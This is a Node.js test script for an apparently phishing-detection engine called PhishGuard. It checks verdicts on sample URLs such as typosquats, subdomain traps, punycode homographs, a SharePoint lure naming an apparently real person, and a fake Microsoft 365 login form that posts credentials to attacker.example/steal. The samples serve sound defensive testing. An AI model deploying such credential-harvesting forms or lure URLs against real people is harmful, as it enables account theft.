#!/usr/bin/env node
"use strict";
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const www = path.join(__dirname, "..", "android", "app", "src", "main", "assets", "www");
const sandbox = {
  console,
  URL,
  URLSearchParams,
  Set,
  Map,
  Math,
  JSON,
  Object,
  Array,
  Number,
  String,
  Boolean,
  parseInt,
  parseFloat,
  isNaN,
  decodeURIComponent,
  encodeURIComponent,
};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(fs.readFileSync(path.join(www, "catalog.js"), "utf8"), sandbox);
vm.runInContext(fs.readFileSync(path.join(www, "engine.js"), "utf8"), sandbox);
const { analyze } = sandbox.PhishGuard;

function assert(cond, msg) {
  if (!cond) {
    console.error("FAIL", msg);
    process.exitCode = 1;
  }
}

let r = analyze("https://login.microsoftonline.com/");
assert(r.verdict === "official", "official microsoft " + r.verdict + " " + r.score);
assert(r.official_brand === "Microsoft", "official brand");
assert(r.score < 20, "official score " + r.score);

r = analyze("https://login.microsoft.com.secure-auth.xyz/signin");
assert(r.verdict === "phishing", "subdomain trap " + r.verdict);
assert(r.impersonated_brand === "Microsoft", "impersonated " + r.impersonated_brand);
const codes = new Set(r.findings.map((f) => f.code));
assert(codes.has("domain_as_subdomain") || codes.has("brand_impersonation"), "trap codes " + [...codes]);

r = analyze("https://micros0ft-online.com/login");
assert(r.verdict === "phishing", "typosquat " + r.verdict + " " + JSON.stringify(r.findings.map((f) => f.code)));
assert(r.impersonated_brand === "Microsoft", "typo brand " + r.impersonated_brand);

r = analyze("https://login.microsoftonline.com@evil.example/login");
assert(r.verdict === "phishing", "@ trick");
assert(r.findings.some((f) => f.code === "userinfo_at"), "userinfo");

r = analyze("http://185.22.10.4/paypal/webscr?cmd=_login");
assert(r.verdict === "phishing", "ip paypal");
assert(r.impersonated_brand === "PayPal", "paypal brand " + r.impersonated_brand);

r = analyze("https://gov-gr-taxisnet.web.app/login");
assert(r.verdict === "phishing", "gov user content " + r.verdict);
assert(r.findings.some((f) => f.code === "user_content_host"), "user content");

r = analyze("javascript:alert(1)");
assert(r.verdict === "dangerous", "js scheme");

r = analyze("   ");
assert(r.verdict === "invalid", "empty");

r = analyze("https://xn--pple-43d.com/login");
assert(r.findings.some((f) => f.code === "homograph"), "punycode");

const share = "https://premierfiregr-my.sharepoint.com/personal/k_pantelides_premierfire_gr/Documents/" +
  "Kimon%20Pantelides%C2%A0%20%CF%83%CE%B1%CF%82%20%CE%AD%CF%83%CF%84%CE%B5%CE%B9%CE%BB%CE%B5" +
  "%20%CE%AD%CE%BD%CE%B1%20%CE%B1%CF%83%CF%86%CE%B1%CE%BB%CE%AD%CF%82%20%CE%BC%CE%AE%CE%BD%CF%85%CE%BC%CE%B1." +
  "%20%CE%9A%CE%AC%CE%BD%CF%84%CE%B5%20%CE%BA%CE%BB%CE%B9%CE%BA%20%CF%83%CF%84%CE%B7%CE%BD%20" +
  "%CE%B5%CF%80%CE%B9%CE%BB%CE%BF%CE%B3%CE%AE%20%CE%9B%CE%AE%CF%88%CE%B7%20%CE%B5%CE%B3%CE%B3%CF%81%CE%AC%CF%86%CE%BF%CF%85" +
  "%20%CE%B3%CE%B9%CE%B1%20%CE%BD%CE%B1%20%CF%84%CE%BF%20%CE%B4%CE%B5%CE%AF%CF%84%CE%B5.pdf?e=4:NWQREU&web=1";
r = analyze(share);
assert(r.verdict === "phishing", "sharepoint lure " + r.verdict + " " + r.score);
assert(r.score >= 80, "sharepoint score " + r.score);
assert(r.findings.some((f) => f.code === "lure_filename"), "lure filename");
assert(r.findings.some((f) => f.code === "trusted_host_lure"), "trusted host lure " + r.findings.map((f) => f.code));

r = analyze("https://contoso-my.sharepoint.com/personal/jane_doe_contoso_com/Documents/Q3-Invoice-2026.xlsx");
assert(r.verdict === "official", "normal sharepoint " + r.verdict + " " + r.score);
assert(r.score < 30, "normal sharepoint score " + r.score);

r = analyze("https://random-kit-landing.web.app/");
assert(r.score >= 30, "free host score " + r.score);

r = analyze('<a href="https://evil.example/login">https://login.microsoftonline.com</a>');
assert(r.verdict === "phishing", "href mismatch " + r.verdict);
assert(r.findings.some((f) => f.code === "href_mismatch"), "href code");

const fake = `<html><head><title>Microsoft 365 Sign in</title></head>
<body><form action="https://attacker.example/steal">
<input type="email" name="loginfmt"><input type="password" name="passwd">
</form></body></html>`;
r = analyze("https://random-unlisted-site.example/owa/", { html: fake, error: null });
assert(r.verdict === "phishing", "html kit " + r.verdict);
assert(r.score >= 85, "html kit score " + r.score);
assert(r.findings.some((f) => f.code === "password_form"), "password form");
assert(r.findings.some((f) => f.code === "brand_in_page"), "brand in page " + r.findings.map((f) => f.code));

if (process.exitCode) {
  console.error("JS engine tests failed");
} else {
  console.log("JS engine tests passed");
}
